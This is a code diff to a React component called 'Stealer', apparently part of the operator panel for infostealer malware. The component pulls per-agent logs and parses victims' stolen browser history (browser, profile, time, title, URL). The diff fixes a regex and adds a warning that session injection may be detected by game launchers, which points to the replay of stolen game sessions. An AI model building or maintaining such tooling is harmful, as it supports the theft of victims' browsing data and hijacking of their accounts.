@@ -32,7 +32,7 @@ export default function Stealer({ agentId }) {
     const [selectedBrowser, setSelectedBrowser] = useState('All');
     const [selectedProfile, setSelectedProfile] = useState('All');
 
-    // Helper Functions (Declared before usage to avoid ReferenceError)
+    // Helper Functions
     const fetchLogs = async (path) => {
         try {
             const safeId = agentId.replace(/:/g, '_');
@@ -95,9 +95,12 @@ export default function Stealer({ agentId }) {
         const text = await fetchLogs(path);
         const { browser, profile } = parseFilename(path);
         const lines = text.split('\n');
-        // FIX: Using a simpler regex to avoid esbuild issues
+        
+        // FIX: Use new RegExp object to prevent build errors with esbuild
+        const historyRegex = new RegExp("^\\\\\[(.*?)\\\\] (.*) \\\\[([^)]+)\\\\]$");
+
         const parsed = lines.filter(l=>l.trim()).map(line => {
-            const match = line.match(/^\\\[(.*?)\\\] (.*) \\\\[([^)]+)\\\]$/);
+            const match = line.match(historyRegex);
             if(match) return { browser, profile, time: match[1], title: match[2], url: match[3] };
             
             // Fallback parsing
@@ -332,9 +335,9 @@ export default function Stealer({ agentId }) {
                     <div className="bg-[#1a1a1a] border border-red-500/50 rounded-xl p-6 max-w-md w-full shadow-2xl relative" onClick={e=>e.stopPropagation()}>
                         <button onClick={()=>setActiveInstruction(null)} className="absolute top-4 right-4 text-gray-500 hover:text-white"><X size={20}/></button>
                         <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2"><Gamepad className="text-red-500"/> {activeInstruction.title}</h3>
-                        <ol className="list-decimal list-inside space-y-3 text-sm text-gray-300">
-                            {activeInstruction.steps.map((step, i) => <li key={i}><span className="text-gray-400">{step}</span></li>)}
-                        </ol>
+                        <div className="mt-6 text-[10px] text-gray-600 border-t border-[#333] pt-2 text-center">
+                            WARNING: SESSION INJECTION MAY BE DETECTED BY GAME LAUNCHERS.
+                        </div>
                     </div>
                 </div>
             )}
